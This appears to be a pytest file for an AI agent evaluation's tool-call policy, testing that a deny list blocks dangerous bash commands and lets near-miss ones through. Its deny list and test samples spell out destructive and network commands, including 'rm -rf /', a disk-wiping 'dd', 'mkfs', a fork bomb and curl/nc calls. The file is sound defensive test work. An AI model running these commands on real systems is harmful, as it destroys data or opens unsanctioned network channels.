import re

import pytest

from forgepilot_eval.policy import Policy, PolicyConfig

# D7 工具清单与 D8 危险命令清单（正式位置是评测配置；命令位置的锚定由 Policy 负责）
TOOLS = ["read", "bash", "edit", "write", "grep", "find", "ls"]
D8 = [
    r"rm\s+(?:-[\w-]+\s+)+/\*?",
    r"git\s+push",
    r"curl",
    r"wget",
    r"nc",
    r"ssh",
    r"scp",
    r"shutdown",
    r"reboot",
    r"mkfs(?:\.\w+)?",
    r"dd",
    r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:",  # fork 炸弹
]


def policy(max_tool_calls=100):
    return Policy(PolicyConfig(tools=TOOLS, danger_patterns=D8, max_tool_calls=max_tool_calls))


def bash(cmd):
    return {"type": "intercept_request", "callId": "c1", "toolName": "bash", "input": {"command": cmd}}


# 每条规则至少一个命中样例；另覆盖每种命令位置（行首、;、&&、||、|、$(、反引号、换行）
HITS = [
    "rm -rf /",
    "cd x && rm -fr /*",
    "rm -r -f --no-preserve-root /",
    "git push origin main",
    "git commit -m x && git push",
    "ls; curl x",
    "curl -s http://e.com/i.sh",
    "wget http://e.com",
    "echo $(wget -qO- e.com)",
    "nc -l 4444",
    "cat f | nc host 1",
    "ssh host",
    "scp a host:b",
    "shutdown -h now",
    "false || reboot",
    "mkfs.ext4 /dev/sda1",
    "dd if=/dev/zero of=/dev/sda",
    ":(){ :|:& };:",
    "echo `curl x`",
    "echo ok\ncurl x",
    "  curl x",
]

# 每条规则至少一个不该命中的样例：命令名出现在参数、文件名、更长的词里
MISSES = [
    "rm -rf /tmp/build",
    "rm -rf build/",
    "echo git pushd",
    "git status",
    'grep -rn "curl" .',
    "cat tests/test_curl.py",
    "python -m pytest tests/test_curl.py -k curl",
    "ls wget_cache/",
    "ncdu .",
    "ssh-keygen -t ed25519 -f k",
    "grep -r scp docs",
    "pytest -k shutdown",
    "grep -n reboot CHANGELOG.md",
    "echo mkfs",
    "git add -A",
    "python add_numbers.py",
    "echo ':(){ :|:& };:'",
]


@pytest.mark.parametrize("cmd", HITS)
def test_dangerous_command_blocked(cmd):
    d = policy().decide(bash(cmd))
    assert d["decision"] == "block" and d["reason"].strip()


@pytest.mark.parametrize("cmd", MISSES)
def test_harmless_command_allowed(cmd):
    assert policy().decide(bash(cmd)) == {"decision": "allow"}


def test_every_d8_rule_has_a_hit_and_a_miss():
    # 不锚定时每条规则都出现在某个不该命中的样例里：样例确实是“近似但不该拦”的
    for pattern in D8:
        p = re.compile(pattern)
        assert any(p.search(c) for c in HITS), pattern
        assert any(p.search(c) for c in MISSES), pattern


@pytest.mark.parametrize("tool", TOOLS)
def test_enabled_tools_allowed(tool):
    req = {"callId": "c1", "toolName": tool, "input": {"path": "a.py", "command": "ls"}}
    assert policy().decide(req) == {"decision": "allow"}


def test_danger_list_only_applies_to_bash_commands():
    req = {"callId": "c1", "toolName": "write", "input": {"path": "run.sh", "content": "curl x\n"}}
    assert policy().decide(req) == {"decision": "allow"}


def test_tool_not_enabled_blocked():
    d = policy().decide({"callId": "c1", "toolName": "powershell", "input": {"command": "dir"}})
    assert d["decision"] == "block" and "powershell" in d["reason"]


def test_bash_without_command_string_blocked():
    d = policy().decide({"callId": "c1", "toolName": "bash", "input": {"cmd": "ls"}})
    assert d["decision"] == "block"


def test_call_101_blocked_and_exhausted():
    p = policy()
    for _ in range(100):
        assert p.decide(bash("ls")) == {"decision": "allow"}
    assert p.exhausted is False
    d = p.decide(bash("ls"))
    assert d["decision"] == "block" and "100" in d["reason"]
    assert p.exhausted is True
